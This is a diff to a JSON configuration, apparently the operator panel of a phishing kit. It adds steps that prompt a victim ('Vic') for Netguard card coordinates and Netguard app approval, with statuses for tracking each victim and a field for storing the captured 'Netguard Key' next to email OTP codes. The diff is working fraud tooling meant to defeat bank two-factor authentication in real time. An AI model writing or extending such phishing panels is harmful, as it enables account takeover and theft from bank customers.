@@ -737,6 +737,18 @@
         "status": "4"
       },
       {
+        "name": "ASK NETGUARD CARD",
+        "status": "8",
+        "input": {
+          "id": "ngc",
+          "placeholder": "Netguard Card Coords (seperate by -, e.g a1-b2-c3)"
+        }
+      },
+      {
+        "name": "ASK NETGUARD APP",
+        "status": "10"
+      },
+      {
         "name": "FINISH",
         "status": "6"
       }
@@ -773,6 +785,18 @@
       {
         "status": 7,
         "meaning": "Vic Resubmitting Login"
+      },
+      {
+        "status": 8,
+        "meaning": "Vic Submitting Netguard Card"
+      },
+      {
+        "status": 9,
+        "meaning": "Vic Waiting... Submitted Netguard Card"
+      },
+      {
+        "status": 10,
+        "meaning": "Vic Approving Netguard App (use another function if they don't accept)"
       }
     ],
     "information": [
@@ -791,6 +815,10 @@
       {
         "heading": "Email OTP",
         "key": "emailCode"
+      },
+      {
+        "heading": "Netguard Key",
+        "key": "netguardKey"
       }
     ],
     "mainInfo": [
